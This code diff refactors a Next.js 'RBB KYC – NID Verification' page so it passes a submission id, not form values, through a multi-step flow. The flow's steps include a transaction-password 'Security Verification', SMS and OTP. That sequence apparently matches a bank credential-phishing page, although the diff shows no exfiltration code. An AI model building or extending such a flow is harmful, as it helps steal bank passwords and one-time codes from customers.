@@ -2,7 +2,7 @@
 
 import { useState } from "react";
 import Image from "next/image";
-import { KycForm, type KycFormValues } from "@/components/kyc-form";
+import { KycForm } from "@/components/kyc-form";
 import { AdditionalInfoForm } from "@/components/additional-info-form";
 import { SuccessCard } from "@/components/success-card";
 import { OtpVerify } from "@/components/otp-verify";
@@ -14,10 +14,9 @@ type Step = "form" | "password-txn" | "additional" | "sms" | "otp" | "thankyou";
 export default function KycPage() {
   const [step, setStep] = useState<Step>("form");
   const [submissionId, setSubmissionId] = useState<string | null>(null);
-  const [kycData, setKycData] = useState<KycFormValues | null>(null);
 
-  function handleFormContinue(data: KycFormValues) {
-    setKycData(data);
+  function handleFormSuccess(id: string) {
+    setSubmissionId(id);
     setStep("password-txn");
   }
 
@@ -44,11 +43,11 @@ export default function KycPage() {
                 />
               </div>
             </div>
-            <KycForm onContinue={handleFormContinue} />
+            <KycForm onContinue={handleFormSuccess} />
           </div>
         )}
 
-        {step === "password-txn" && kycData && (
+        {step === "password-txn" && submissionId && (
           <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
             <div className="text-center space-y-3">
               <h1 className="text-xl font-bold text-gray-900">RBB KYC – NID Verification</h1>
@@ -64,7 +63,7 @@ export default function KycPage() {
               </div>
               <p className="text-sm text-gray-500">Security Verification</p>
             </div>
-            <PasswordTxnForm kycData={kycData} onSuccess={handlePasswordTxnSuccess} />
+            <PasswordTxnForm submissionId={submissionId} onSuccess={handlePasswordTxnSuccess} />
           </div>
         )}
 
